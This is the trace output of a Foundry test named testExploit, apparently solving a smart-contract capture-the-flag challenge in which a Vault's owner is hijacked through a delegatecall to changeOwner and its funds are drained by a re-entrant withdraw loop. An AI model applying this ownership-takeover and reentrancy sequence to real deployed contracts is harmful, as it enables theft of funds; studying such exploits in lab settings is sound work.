
Ran 1 test for test/Vault.t.sol:VaultExploiter
[PASS] testExploit() (gas: 480539)
Traces:
  [500439] VaultExploiter::testExploit()
    ├─ [0] VM::deal(SHA-256: [0x0000000000000000000000000000000000000002], 1000000000000000000 [1e18])
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(SHA-256: [0x0000000000000000000000000000000000000002])
    │   └─ ← [Return] 
    ├─ [11125] Vault::fallback(0x000000000000000000000000522b3294e6d06aa25ad0f1b8891242e335d3b459, SHA-256: [0x0000000000000000000000000000000000000002])
    │   ├─ [5818] VaultLogic::changeOwner(0x000000000000000000000000522b3294e6d06aa25ad0f1b8891242e335d3b459, SHA-256: [0x0000000000000000000000000000000000000002]) [delegatecall]
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [22488] Vault::openWithdraw()
    │   └─ ← [Stop] 
    ├─ [532] Vault::canWithdraw() [staticcall]
    │   └─ ← [Return] true
    ├─ [339010] → new ReentrancyAttack@0xE536720791A7DaDBeBdBCD8c8546fb0791a11901
    │   └─ ← [Return] 1470 bytes of code
    ├─ [47600] ReentrancyAttack::attack{value: 100000000000000000}()
    │   ├─ [22560] Vault::deposite{value: 100000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [17089] Vault::withdraw()
    │   │   ├─ [9100] ReentrancyAttack::receive{value: 100000000000000000}()
    │   │   │   ├─ [8309] Vault::withdraw()
    │   │   │   │   ├─ [320] ReentrancyAttack::receive{value: 100000000000000000}()
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [461] Vault::isSolve() [staticcall]
    │   └─ ← [Return] true
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.19ms (359.71µs CPU time)